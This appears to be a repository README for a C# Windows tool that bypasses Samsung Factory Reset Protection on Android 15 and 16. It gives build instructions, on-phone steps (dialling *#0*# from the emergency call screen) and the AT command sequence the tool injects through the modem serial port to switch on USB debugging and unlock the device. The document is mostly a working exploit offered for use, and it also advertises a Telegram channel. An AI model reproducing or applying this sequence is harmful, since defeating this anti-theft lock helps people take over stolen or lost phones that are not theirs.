# 🔓 Samsung FRP Bypass Tool (Android 15 & 16) - C# Source Code

![License](https://img.shields.io/badge/license-MIT-blue.svg) ![Platform](https://img.shields.io/badge/platform-Windows-lightgrey.svg) ![Language](https://img.shields.io/badge/language-C%23%20%7C%20.NET-purple.svg)

**Developed by IRS Team** | **Open Source C# Project**

> **[Join our Telegram Channel for Updates & More Tools](https://t.me/imeirepairserverupdates)**

---

## 📖 Overview
This repository contains the full **C# (.NET)** source code for the Samsung FRP Bypass Tool. It is designed to unlock Samsung devices running **Android 15 and 16** by exploiting the modem interface to enable USB Debugging.

This is a complete **Visual Studio (Windows Forms)** project. You can compile it, modify the UI, or use the logic in your own repair tools.

### ✨ Features
* ✅ **Target:** Samsung Android 15 & 16 (Latest Security).
* ✅ **Method:** AT Command Injection (Modem Port).
* ✅ **GUI:** User-friendly Windows Forms Interface.
* ✅ **Zero Dependencies:** No external dongles or credits required.
* ✅ **Auto-Detection:** Automatically finds Samsung Modem ports via WMI.

---

## 🛠️ Project Requirements

### Development Environment
* **IDE:** Visual Studio 2019, 2022, or 2025.
* **Framework:** .NET Framework 4.7.2.
* **References:** `System.Management` (included in project).

### Runtime Requirements
To run the compiled tool, you need:
1.  **Samsung USB Drivers:** [Download Here](https://developer.samsung.com/android-usb-driver)
2.  **ADB Files:** You must manually place `adb.exe`, `AdbWinApi.dll`, and `AdbWinUsbApi.dll` in the output folder.

---

## 🚀 How to Build & Run

1.  **Clone or Download** this repository.
2.  Open `SamsungFRPTool.sln` in Visual Studio.
3.  **Right-click** the project in Solution Explorer and select **Build**.
4.  **Critical Step:**
    * Go to the build folder: `\bin\Debug\` (or `\bin\Release\`).
    * **Paste** your ADB files (`adb.exe`, etc.) into this folder.
    * *Without ADB files, the unlock feature will fail.*
5.  Run `SamsungFRPTool.exe`.
6.  Connect the phone (ensure it is on the **Emergency Call** screen).
7.  Dial `*#0*#` on the phone.
8.  Click **Enable ADB & Unlock**.

---

## ⚙️ Exploit Logic (C#)
The core logic resides in `Form1.cs`. It sends the following proprietary command chain to the modem serial port:

```csharp
string[] commands = new string[]
{
    "AT\r\n",               // Handshake
    "AT+KSTRINGB=0,3\r\n",   // Trigger
    "AT+DUMPCTRL=1,0\r\n",   // Crash Dump Init
    "AT+DEBUGLVL=0,4\r\n",   // Debug Level High
    "AT+SWATD=0\r\n",        // Watchdog Disable
    "AT+ACTIVATE=0,0,0\r\n", // Activate Service
    "AT+SWATD=1\r\n"         // Watchdog Enable (Triggers USB Refresh)
};
